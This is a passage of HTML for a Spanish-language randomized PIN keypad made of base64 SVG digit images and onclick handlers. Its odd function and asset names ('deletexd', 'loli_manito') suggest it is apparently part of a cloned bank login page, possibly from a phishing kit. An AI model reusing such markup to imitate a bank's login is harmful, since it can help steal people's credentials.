D0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjEsMTZjMC0yLjcsMS41LTMuMywzLjktMy4zYzMsMCwzLjcsMS42LDMuNyw0LjJjMCw0LjctMSw2LjItNS42LDYuMmMtMC4xLDAtMC4zLDAtMS4xLDAgICBsLTAuMS0xLjRjMS44LTAuMSw1LDAuMyw1LTIuNmMtMC41LDAuMS0xLjMsMC4yLTIsMC4yQzE1LjUsMTkuMiwxNC4xLDE4LjUsMTQuMSwxNnogTTE4LDE0Yy0xLjcsMC0yLjIsMC41LTIuMiwxLjkgICBjMCwxLjUsMC44LDEuOCwyLjIsMS44YzAuNiwwLDEuMy0wLjEsMS44LTAuMmMwLTAuMywwLTAuNywwLTFDMTkuOSwxNS4zLDE5LjcsMTQsMTgsMTR6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyOCIgY3k9IjIwIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iNSIgY3k9IjgiLz4KPC9zdmc+"></div>
               <div class="keypad-digit" onclick="evalRanTable('1'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE5LjYsMTIuN3YxMC4yaC0xLjh2LTguNGMtMC42LDAuMi0xLjYsMC4zLTIuMywwLjRsLTAuMS0xLjRjMS4yLTAuMiwyLjEtMC41LDIuNy0wLjggICBDMTguMiwxMi43LDE5LjYsMTIuNywxOS42LDEyLjd6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxMCIgY3k9IjM0Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iNiIgY3k9IjEyIi8+Cjwvc3ZnPg=="></div>
               <div class="keypad-digit" onclick="evalRanTable('4'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LjksMjAuNmgtMy43Yy0xLDAtMS4yLTAuNC0xLjItMC45YzAtMC4zLDAuMS0wLjcsMC43LTEuNWwzLjYtNC42YzAuNS0wLjcsMC45LTAuOSwxLjUtMC45ICAgYzAuNSwwLDAuOSwwLjMsMC45LDEuMXY1LjVIMjJ2MS4zaC0xLjNWMjNIMTl2LTIuNEgxOC45eiBNMTUuNywxOS4yaDMuMlYxNUwxNS43LDE5LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSI1IiBjeT0iMTAiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxNyIgY3k9IjI2Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTIiIGN5PSIyOSIvPgo8L3N2Zz4="></div>
               <div class="keypad-digit" onclick="evalRanTable('0'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDIzYy0zLjEsMC0zLjgtMS43LTMuOC01LjJzMC42LTUuMiwzLjgtNS4yczMuOCwxLjcsMy44LDUuMlMyMS4xLDIzLDE4LDIzeiBNMTgsMjEuNiAgIGMxLjksMCwyLTEuNSwyLTMuOFMxOS45LDE0LDE4LDE0cy0yLDEuNS0yLDMuOFMxNi4xLDIxLjYsMTgsMjEuNnoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjQiIGN5PSI2Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTIiIGN5PSIxNiIvPgo8L3N2Zz4="></div>
               <div class="keypad-digit" onclick="evalRanTable('8'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDEyLjZjMS43LDAsMy42LDAuNSwzLjYsMi41YzAsMS4xLTAuMiwxLjgtMS41LDIuNWMxLDAuNiwxLjYsMS4yLDEuNiwyLjVjMCwyLjQtMS43LDIuOS0zLjgsMi45ICAgYy0yLjIsMC0zLjgtMC43LTMuOC0yLjljMC0xLjMsMC42LTEuOSwxLjYtMi41Yy0xLTAuNi0xLjUtMS4yLTEuNS0yLjVDMTQuNCwxMy4xLDE2LjIsMTIuNiwxOCwxMi42eiBNMTgsMjEuNmMxLjEsMCwyLTAuMywyLTEuNiAgIGMwLTEuMS0wLjQtMS42LTIuNS0xLjhjLTEsMC4yLTEuNiwwLjctMS42LDEuOEMxNiwyMS40LDE2LjgsMjEuNiwxOCwyMS42eiBNMTguNCwxNi45YzEtMC4yLDEuNS0wLjYsMS41LTEuNmMwLTEuMi0wLjktMS40LTItMS40ICAgUzE2LDE0LjEsMTYsMTUuM0MxNi4xLDE2LjIsMTYuNCwxNi44LDE4LjQsMTYuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjMwIiBjeT0iMSIvPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjI1IiBjeT0iMjAiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyMSIgY3k9IjExIi8+Cjwvc3ZnPg=="></div>
               <div class="keypad-digit" onclick="evalRanTable('2'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjQsMjIuOWMwLjYtMy4xLDAuOC00LjMsMy4yLTUuM2MxLjQtMC42LDItMS4xLDItMi4yUzE5LDE0LDE3LDE0Yy0wLjcsMC0xLjYsMC4xLTIuMywwLjIgICBMMTQuNiwxM2MwLjktMC4yLDIuMS0wLjMsMy4zLTAuM2MyLDAsMy42LDAuNSwzLjYsMi41YzAsMS45LTEsMy0zLDMuOGMtMS42LDAuNi0xLjksMS4yLTIsMi41aDVWMjNMMTQuNCwyMi45TDE0LjQsMjIuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjE2IiBjeT0iMjUiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMSIgY3k9IjE4Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjIiIGN5PSIyNyIvPgo8L3N2Zz4="></div>
               <div class="keypad-digit" onclick="evalRanTable('3'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjMsMTUuMmMwLDEuMS0wLjUsMS45LTEuNSwyLjRjMSwwLjQsMS42LDEsMS42LDIuM2MwLDIuNC0xLjUsMy4yLTMuOSwzLjIgICBjLTEuMiwwLTIuMi0wLjEtMy4xLTAuM2wwLjItMS40YzAuOCwwLjEsMS43LDAuMiwyLjUsMC4yYzEuNywwLDIuNC0wLjMsMi40LTEuNmMwLTAuOS0wLjQtMS40LTEuMi0xLjVjLTAuNi0wLjEtMS4zLTAuMS0yLjEtMC4xICAgSDE2VjE3YzAuOCwwLDEuNi0wLjEsMi4zLTAuMmMwLjgtMC4xLDEuMS0wLjYsMS4xLTEuNGMwLTEuMi0wLjktMS4zLTIuMS0xLjNjLTAuOSwwLTEuOCwwLjEtMi43LDAuMkwxNC40LDEzICAgYzAuOS0wLjIsMS45LTAuMywzLTAuM0MxOS41LDEyLjYsMjEuMywxMywyMS4zLDE1LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMCIgY3k9IjE1Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTgiIGN5PSIxIi8+Cjwvc3ZnPg=="></div>

               <div class="keypad-digit bg" onclick="deletexd(); logintud(); clear_error_card(); clear_error_clave();">
                  <img class="image-action" alt="Eliminar" title="Eliminar" src="files/img/loli_manito_clean.svg">
               </div>

               <div class="keypad-digit" onclick="evalRanTable('6'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjksMTkuN2MwLDIuNy0xLjUsMy4zLTMuOSwzLjNjLTMsMC0zLjctMS42LTMuNy00LjJjMC00LjcsMS02LjIsNS42LTYuMmMwLjEsMCwwLjMsMCwxLjEsMCAgIGwwLjEsMS40Yy0xLjgsMC4xLTUtMC4zLTUsMi42YzAuNS0wLjEsMS4zLTAuMiwyLTAuMkMyMC41LDE2LjUsMjEuOSwxNy4xLDIxLjksMTkuN3ogTTE3LjksMjEuNmMxLjcsMCwyLjItMC41LDIuMi0xLjkgICBjMC0xLjUtMC44LTEuOC0yLjItMS44Yy0wLjYsMC0xLjMsMC4xLTEuOCwwLjJjMCwwLjMsMCwwLjcsMCwxQzE2LjEsMjAuMywxNi4zLDIxLjYsMTcuOSwyMS42eiIvPgo8L2c+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iNCIgY3k9IjE3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjEiIGN5PSIzMyIvPgo8L3N2Zz4="></div>
               <div class="keypad-digit" onclick="evalRanTable('7'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjYsMTQuMnYtMS41aDZjMC43LDAsMS4xLDAuMywxLjEsMC44YzAsMC4yLDAsMC40LTAuMSwwLjZsLTQsOC44aC0ybDQuMy04LjcgICBDMTkuOSwxNC4yLDE0LjYsMTQuMiwxNC42LDE0LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMSIgY3k9IjI2Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjYiIGN5PSIxIi8+Cjwvc3ZnPg=="></div>
               <div class="keypad-digit" onclick="evalRanTable('5'); logintud(); clear_error_card(); clear_error_clave();"><img class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjcsMjEuM2MwLjgsMC4xLDEuNywwLjIsMi41LDAuMmMxLjgsMCwyLjQtMC4yLDIuNC0yYzAtMS40LTEuNS0xLjYtMi44LTEuNmMtMC43LDAtMS4zLDAtMiwwICAgbDAuNC01LjNoNi4xdjEuNWgtNC42bC0wLjIsMi40YzAuMiwwLDAuNSwwLDAuNywwYzIuNSwwLDQuMywwLjQsNC4zLDMuMWMwLDIuNC0xLjMsMy4zLTMuOCwzLjNjLTEuMSwwLTIuMi0wLjEtMy4yLTAuM0wxNC43LDIxLjN6ICAgIi8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxMSIgY3k9IjI2Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMiIgY3k9IjExIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTAiIGN5PSI5Ii8+Cjwvc3ZnPg=="></div>
            
               <div class="keypad-digit bg" onclick="clearxd(); logintud(); clear_error_card(); clear_error_clave();">
                  <img class="image-action" alt="Limpiar" title="Limpiar" src="files/img/loli_manito_delete.svg">
               </div>
        </div>

       <div id="keypadpc" class="keypad-seed-container hidden">
        <div>
          <div class="separator left">
            <img onclick="evalRanTable('1'); logintud(); clear_error_card(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE5LjYsMTIuN3YxMC4yaC0xLjh2LTguNGMtMC42LDAuMi0xLjYsMC4zLTIuMywwLjRsLTAuMS0xLjRjMS4yLTAuMiwyLjEtMC41LDIuNy0wLjggICBDMTguMiwxMi43LDE5LjYsMTIuNywxOS42LDEyLjd6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSI1IiBjeT0iMTIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxIiBjeT0iMTEiLz4KPC9zdmc+">
